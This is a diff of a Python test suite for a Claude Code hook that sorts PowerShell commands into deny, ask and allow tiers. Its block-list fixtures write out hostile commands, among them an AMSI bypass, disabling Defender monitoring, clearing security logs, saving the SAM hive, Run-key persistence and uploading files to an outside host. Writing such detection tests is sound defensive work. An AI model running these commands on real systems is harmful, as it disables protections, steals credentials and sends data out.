@@ -1,9 +1,8 @@
 #!/usr/bin/env python3
 """Tests for hooks/block_destructive_powershell.py.
 
-Runs the hook as a subprocess against synthetic Claude Code payloads,
-which is the limit of what this suite proves: it has not been exercised
-against a live PowerShell tool call.
+Runs the hook in a persistent subprocess against synthetic Claude Code
+payloads. This suite has not exercised a live PowerShell tool call.
 """
 import base64
 import json
@@ -22,6 +21,15 @@ from pathlib import Path
 REPO_ROOT = Path(__file__).resolve().parent.parent
 HOOK_PATH = REPO_ROOT / "hooks" / "block_destructive_powershell.py"
 BLOCKING_EXIT_CODE = 2
+_HOOK_WORKER = None
+
+
+def hook_worker():
+    """Return the process-local persistent PowerShell hook worker."""
+    global _HOOK_WORKER
+    if _HOOK_WORKER is None:
+        _HOOK_WORKER = gate_corpus.HookWorker(HOOK_PATH)
+    return _HOOK_WORKER
 
 
 def run_hook(command, permission_mode: str = "default", cwd: str = "") -> tuple:
@@ -34,18 +42,12 @@ def run_hook(command, permission_mode: str = "default", cwd: str = "") -> tuple:
     }
     if cwd:
         payload["cwd"] = cwd
-    result = subprocess.run(
-        [sys.executable, str(HOOK_PATH)],
-        input=json.dumps(payload),
-        capture_output=True,
-        text=True,
-        check=False,
-    )
+    code, stdout, _stderr = hook_worker().invoke(payload)
     try:
-        decision = json.loads(result.stdout)["hookSpecificOutput"]["permissionDecision"]
+        decision = json.loads(stdout)["hookSpecificOutput"]["permissionDecision"]
     except (ValueError, KeyError):
         decision = ""
-    return result.returncode, decision
+    return code, decision
 
 
 def encoded(command: str) -> str:
@@ -105,10 +107,10 @@ class WrapperTest(unittest.TestCase):
     CASES = (
         ("& Remove-Item -Recurse C:\\work\\build", "ask"),
         ("Start-Process Remove-Item -Recurse C:\\work\\build", "ask"),
-        ("powershell -Command 'Remove-Item -Recurse C:\\work\\build'", "ask"),
-        ("pwsh -c 'Remove-Item -Recurse C:\\work\\build'", "ask"),
+        ("powershell -Command 'Remove-Item -Recurse C:\\work\\build'", "deny"),
+        ("pwsh -c 'Remove-Item -Recurse C:\\work\\build'", "deny"),
         ("cmd /c rd /s /q C:\\work\\build", "ask"),
-        ("Invoke-Expression 'Remove-Item -Recurse C:\\work\\build'", "ask"),
+        ("Invoke-Expression 'Remove-Item -Recurse C:\\work\\build'", "deny"),
     )
 
     def test_wrapped_commands_are_classified(self):
@@ -134,13 +136,13 @@ class EncodedCommandTest(unittest.TestCase):
             for flag in self.FLAGS:
                 with self.subTest(program=program, flag=flag):
                     _, decision = run_hook(f"{program} {flag} {payload}")
-                    self.assertEqual(decision, "ask")
+                    self.assertEqual(decision, "deny")
 
-    def test_benign_encoded_payload_passes(self):
+    def test_benign_encoded_payload_denies(self):
         for flag in self.FLAGS:
             with self.subTest(flag=flag):
                 _, decision = run_hook(f"pwsh {flag} {encoded('Get-ChildItem')}")
-                self.assertEqual(decision, "")
+                self.assertEqual(decision, "deny")
 
     def test_malformed_encoded_payloads_deny(self):
         invalid_utf16 = base64.b64encode(bytes((0, 216))).decode("ascii")
@@ -167,6 +169,198 @@ class EncodedCommandTest(unittest.TestCase):
     def test_e_is_not_encoded_command_for_an_unrelated_interpreter(self):
         _, decision = run_hook("python -e not-base64")
         self.assertEqual(decision, "")
+
+    def test_command_flag_without_payload_still_denies(self):
+        _, decision = run_hook("pwsh -Command")
+        self.assertEqual(decision, "deny")
+
+
+class PowerShellPolicyTest(unittest.TestCase):
+    """High-risk PowerShell families receive the configured policy tier."""
+
+    DENY = (
+        "Invoke-Expression 'Get-Date'",
+        "iex 'Get-Date'",
+        "Invoke-Command -ComputerName server -ScriptBlock { Get-Date }",
+        "Invoke-Command -Comp server -ScriptBlock { Get-Date }",
+        "icm -Session $session -ScriptBlock { Get-Date }",
+        "pwsh -Command 'Get-Date'",
+        "powershell -ExecutionPolicy Bypass -File safe.ps1",
+        "pwsh -WindowStyle Hidden -File safe.ps1",
+        "Add-Type -TypeDefinition 'public class X {}'",
+        "[System.Reflection.Assembly]::Load($bytes)",
+        "[System.Diagnostics.Process]::Start('cmd.exe')",
+        "New-Object System.Net.WebClient",
+        "New-Object -ComObject WScript.Shell",
+        "Start-Process -FilePath $program",
+        ". $scriptPath",
+        "$dynamicCommand argument",
+        "Import-Module $modulePath",
+        "pwsh -File $scriptPath",
+        "'\\\\server\\share\\remote-tool.exe'",
+        "[Ref].Assembly.GetType('System.Management.Automation.AmsiUtils')",
+        "Register-ObjectEvent -InputObject $x -EventName Changed -Action {}",
+        "Start-Job -ScriptBlock { Get-Date }",
+        "Set-ExecutionPolicy RemoteSigned",
+        "Set-MpPreference -DisableRealtimeMonitoring $true",
+        "Add-MpPreference -ExclusionPath C:\\work",
+        "New-NetFirewallRule -DisplayName x -Direction Inbound -Action Allow",
+        "Set-ItemProperty HKLM:\\Software\\Microsoft\\Windows\\CurrentVersion"
+        "\\Run -Name x -Value evil.exe",
+        "Set-ItemProperty HKCU:\\Software\\Microsoft\\Windows\\CurrentVersion"
+        "\\Internet Settings -Name ProxyServer -Value proxy.example.test",
+        "Set-Content $PROFILE persistence-code",
+        "New-CimInstance -Namespace root\\subscription -ClassName __EventFilter",
+        "secedit /configure /db policy.sdb",
+        "auditpol /set /category:* /success:disable",
+        "wevtutil cl Security",
+        "bcdedit /set recoveryenabled no",
+        "netsh advfirewall set allprofiles state off",
+        "reg save HKLM\\SAM opaque.backup",
+        "manage-bde -protectors -disable C:",
+        "route add 10.20.0.0 mask 255.255.0.0 10.0.0.1",
+        "winrs -r:server cmd",
+        "schtasks /create /tn task /tr opaque.exe /sc daily",
+        "Format-Volume -DriveLetter D",
+        "Clear-Disk -Number 1 -RemoveData",
+        "Disable-BitLocker -MountPoint C:",
+        "Import-Certificate -FilePath root.cer -CertStoreLocation Cert:\\LocalMachine\\Root",
+        "Set-AuthenticodeSignature script.ps1 $certificate",
+        "Export-PfxCertificate -Cert cert:\\CurrentUser\\My\\1 -FilePath key.pfx",
+        "Get-Secret production-password",
+        "Register-ScheduledTask -TaskName x -Action $action",
+        "New-Service -Name x -BinaryPathName evil.exe",
+        "Enable-PSRemoting -Force",
+        "Set-WSManQuickConfig -Force",
+        "New-PSSession -ComputerName server",
+        "Enter-PSSession -ComputerName server",
+        "Copy-Item source.database '\\\\server\\share'",
+        "New-PSDrive X -PSProvider FileSystem -Root \\\\server\\share",
+        "scp records.csv user@host:/tmp",
+        "curl --upload-file snapshot.binary https://example.test/upload",
+        "Invoke-WebRequest https://example.test/upload -Method Post"
+        " -InFile opaque.data",
+        "Invoke-RestMethod https://example.test/item -Method Delete",
+        "Invoke-RestMethod https://example.test/query -Body opaque.data",
+        "Invoke-WebRequest https://example.test/item -Method:Post",
+        "Send-MailMessage -To x@example.test -Body data -SmtpServer mail.example.test",
+        "Remove-Item Cert:\\CurrentUser\\My\\opaque-thumbprint",
+        "Invoke-WebRequest https://example.test/artifact.exe -OutFile random.cache",
+        "Set-DnsClientServerAddress -InterfaceAlias Ethernet -ServerAddresses 1.2.3.4",
+    )
+
+    ASK = (
+        "Start-Process notepad.exe",
+        "New-Object System.Text.StringBuilder",
+        "& .\\build.ps1",
+        ". .\\profile.ps1",
+        "Invoke-Command -ScriptBlock { Get-Date }",
+        "Invoke-Item report.data",
+        "Import-Module Pester",
+        "ipmo Pester",
+        "Install-Module Pester",
+        "Update-Module Pester",
+        "Find-Module Pester",
+        "Set-Service app -StartupType Manual",
+        "Restart-Service app",
+        "Stop-Service app",
+        "Set-ItemProperty HKCU:\\Software\\Example -Name x -Value y",
+        "Set-Content *.binary replacement",
+        "Copy-Item -Recurse src out",
+        "Get-Credential",
+        "Get-LocalUser",
+        "New-LocalUser service-user",
+        "Get-ADUser alice",
+        "Set-ADUser alice -Enabled $false",
+        "Invoke-WebRequest https://example.test/data.json",
+        "Invoke-WebRequest https://example.test/data.json -Method Get",
+        "iwr https://example.test/alternate.data",
+        "Start-BitsTransfer https://example.test/data.json data.json",
+        "Test-NetConnection example.test -Port 443",
+        "Get-NetTCPConnection",
+        "Resolve-DnsName example.test",
+        "nslookup example.test",
+        "ssh host.example.test",
+        "Get-CimInstance Win32_LogonSession",
+        "Get-ChildItem Cert:\\CurrentUser\\My",
+        "gci Cert:\\CurrentUser\\Root",
+        "saps notepad.exe",
+        "pwsh -File scripts\\build.ps1",
+        "pwsh -NoProfile -File scripts\\build.ps1",
+        "pwsh -ExecutionPolicy RemoteSigned -File scripts\\build.ps1",
+        "pwsh -WindowStyle Normal -File scripts\\build.ps1",
+        ".\\tools\\local-tool.exe",
+        "curl https://example.test/opaque.data",
+        "secedit /analyze /db policy.sdb",
+        "route print",
+        "[System.Net.Dns]::GetHostAddresses('example.test')",
+    )
+
+    ARCHIVE_CASES = (
+        "Compress-Archive project-alpha\\* artifact-145.zip",
+        "Compress-Archive -Path logs\\*.json -DestinationPath snapshot.data",
+        "Expand-Archive package-938.zip extraction-area",
+        "Expand-Archive -Path unrelated.bundle -DestinationPath generated-files",
+    )
+
+    FILE_NAME_CASES = (
+        ("Set-Content image.bin value", ""),
+        ("Set-Content records.csv value", ""),
+        ("Set-Content application.state $value", ""),
+        ("Copy-Item source.database destination.backup", ""),
+        ("Set-Content *.binary value", "ask"),
+        ("Set-Content $outputPath value", "ask"),
+        ("Clear-Content opaque.database", "ask"),
+        ("Copy-Item -Recurse source-tree generated-tree", "ask"),
+        ("Copy-Item $sourcePath generated.backup", "ask"),
+        ("cp -Rec input-tree output-tree", "ask"),
+        ("Copy-Item opaque.data '\\\\server\\drop'", "deny"),
+        ("Copy-Item opaque.data C:\\Windows\\System32\\opaque.config", "deny"),
+        ("Export-PfxCertificate -Cert cert:\\CurrentUser\\My\\1"
+         " -FilePath opaque.backup", "deny"),
+        ("curl --upload-file archive.binary https://example.test/upload", "deny"),
+    )
+
+    ALLOW = (
+        "Get-ChildItem .",
+        "Test-Path README.md",
+        "Get-Content README.md",
+        "ConvertTo-Json @{name='value'}",
+        "Get-Service app",
+        "Set-Content application.state value",
+        "Copy-Item source.database destination.backup",
+        "wevtutil qe Application /c:1",
+        "manage-bde -status",
+        "auditpol /get /category:*",
+        "reg query HKCU\\Software\\Example",
+        "bcdedit /enum",
+        "pwsh --version",
+    )
+
+    def test_deny_families_are_refused(self):
+        for command in self.DENY:
+            with self.subTest(command=command):
+                self.assertEqual(run_hook(command)[1], "deny")
+
+    def test_bounded_administration_asks(self):
+        for command in self.ASK:
+            with self.subTest(command=command):
+                self.assertEqual(run_hook(command)[1], "ask")
+
+    def test_archive_policy_does_not_depend_on_example_filenames(self):
+        for command in self.ARCHIVE_CASES:
+            with self.subTest(command=command):
+                self.assertEqual(run_hook(command)[1], "ask")
+
+    def test_file_policy_uses_operation_and_path_properties(self):
+        for command, expected in self.FILE_NAME_CASES:
+            with self.subTest(command=command):
+                self.assertEqual(run_hook(command)[1], expected)
+
+    def test_routine_local_operations_pass(self):
+        for command in self.ALLOW:
+            with self.subTest(command=command):
+                self.assertEqual(run_hook(command)[1], "")
 
 
 class GitDelegationTest(unittest.TestCase):
